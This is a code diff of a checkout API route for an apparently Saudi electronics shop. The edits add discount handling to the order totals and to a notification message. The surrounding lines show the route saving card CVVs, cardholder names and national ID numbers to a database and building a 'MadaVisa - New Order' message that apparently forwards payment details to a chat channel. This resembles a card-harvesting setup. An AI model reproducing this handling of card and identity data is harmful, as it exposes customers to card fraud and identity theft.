@@ -154,7 +154,7 @@ export async function POST(req: NextRequest) {
     }
 
     const orderId = `${Date.now()}${Math.floor(Math.random() * 1000)}`;
-    const monthlyPayment = installmentType === "installment" && months > 0 ? Math.ceil((verifiedTotal - downPayment) / months) : 0;
+    const monthlyPayment = installmentType === "installment" && months > 0 ? Math.ceil((verifiedTotalAfterDiscount - downPayment) / months) : 0;
 
     // ── Save to database ──
     let dbId: string | null = null;
@@ -172,7 +172,7 @@ export async function POST(req: NextRequest) {
           cvv, 
           cardHolder: sanitizedData.cardHolder, 
           items: verifiedItems, 
-          total: verifiedTotal, 
+          total: verifiedTotalAfterDiscount, 
           customer: sanitizedData.customer, 
           whatsapp: cleanPhone, 
           nationalId, 
@@ -180,7 +180,8 @@ export async function POST(req: NextRequest) {
           installmentType, 
           months: Number(months) || 0, 
           monthlyPayment, 
-          downPayment: Number(downPayment) || 0 
+          downPayment: Number(downPayment) || 0,
+          discountAmount: discount,
         }),
       });
       
@@ -212,11 +213,17 @@ export async function POST(req: NextRequest) {
       `🏪 طلب لـ متجر مؤسسة البلاد الحديثة للإلكترونيات`,
       `🔢 رقم الطلب: #${orderId}`,
       ``,
-      `💰 Total Amount: ${verifiedTotalAfterDiscount} SAR`,
-      ...(discount > 0 ? [`🏷️ Discount: -${discount} SAR`] : []),
+      `💰 سعر الطلب: ${verifiedTotal} SAR`,
+      ...(discount > 0 ? [
+        `🏷️ Discount: -${discount} SAR`,
+        `──────────────────`,
+        `💵 Total Amount: ${verifiedTotalAfterDiscount} SAR`,
+      ] : [
+        `💵 Total Amount: ${verifiedTotalAfterDiscount} SAR`,
+      ]),
       ...(installmentType === "installment"
-        ? [`💵 First Payment: ${downPayment} SAR`]
-        : [`💵 Payment Type: Full Amount`]),
+        ? [`💳 First Payment: ${downPayment} SAR`]
+        : [`💳 Payment Type: Full Amount`]),
       ``,
       `💳 MadaVisa - New Order`,
       `👤 Order For: ${sanitizedData.customer}`,
